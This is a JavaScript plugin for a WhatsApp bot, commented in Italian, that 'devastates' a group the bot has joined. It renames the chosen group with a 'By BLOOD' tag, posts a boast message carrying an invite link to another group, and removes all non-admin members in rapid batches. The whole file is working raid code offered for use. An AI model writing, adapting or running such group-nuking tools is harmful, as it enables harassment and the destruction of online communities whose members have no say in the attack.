let handler = async (m, { conn, text, command }) => {
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    const botId = conn.user.id.includes(':') ? conn.user.id.split(':')[0] + '@s.whatsapp.net' : conn.user.id;

    // 1. RECUPERO GRUPPI (Solo in Privata)
    let getGroups = await conn.groupFetchAllParticipating();
    let groups = Object.values(getGroups);
    
    if (groups.length === 0) return m.reply("❌ Il bot non è in alcun gruppo.");

    // 2. MOSTRA LISTA
    if (!text) {
        let txt = "😈 *Scegli l'obiettivo da flettere:*\n\n";
        groups.forEach((g, i) => {
            txt += `*${i + 1}.* ${g.subject}\n`;
        });
        txt += `\n👉 Scrivi: *.${command} [numero]*`;
        return m.reply(txt);
    }

    // 3. SELEZIONE BERSAGLIO
    let index = parseInt(text) - 1;
    if (isNaN(index) || !groups[index]) return m.reply("❌ Numero non valido.");

    let targetChat = groups[index].id;
    let targetName = groups[index].subject;

    await m.reply(`🚀 Inizio devastazione su: *${targetName}*...`);

    try {
        // 4. ESECUZIONE DIRETTA SUL GRUPPO TARGET
        // Otteniamo i metadati freschi del gruppo scelto
        let metadata = await conn.groupMetadata(targetChat, true).catch(() => null);
        if (!metadata) return m.reply("❌ Errore: Impossibile accedere ai dati del gruppo.");

        // A. Cambio Nome
        await conn.groupUpdateSubject(targetChat, `${metadata.subject} | 𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`).catch(() => {});

        // B. Messaggio nel gruppo
        await conn.sendMessage(targetChat, {
            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭ο 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐞 𝐪𝐮𝐞𝐬𝐭𝐨 𝐬𝐢𝐠𝐧𝐢𝐟𝐢𝐜𝐚 𝐬𝐨𝐥𝐨 𝐮𝐧𝐚 𝐜𝐨𝐬𝐚, 𝐃𝐄𝐕𝐀𝐒𝐓Ο.\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri"
        });

        // C. Rimozione Membri (Raffica)
        let participants = metadata.participants;
        let usersToRemove = participants
            .filter(p => p.id !== botId && !ownerJids.includes(p.id) && p.admin === null)
            .map(p => p.id);

        if (usersToRemove.length > 0) {
            const size = 4; // 4 persone alla volta
            for (let i = 0; i < usersToRemove.length; i += size) {
                let chunk = usersToRemove.slice(i, i + size);
                await conn.groupParticipantsUpdate(targetChat, chunk, 'remove').catch(() => {});
                await new Promise(res => setTimeout(res, 300)); // Delay di 300ms
            }
        }

        await m.reply(`✅ Devastazione di *${targetName}* completata con successo.`);

    } catch (e) {
        console.error(e);
        await m.reply("❌ Errore critico durante l'esecuzione.");
    }
};

handler.command = ['fotti'];
handler.owner = true;
handler.private = true; // Funziona SOLO in chat privata

export default handler;
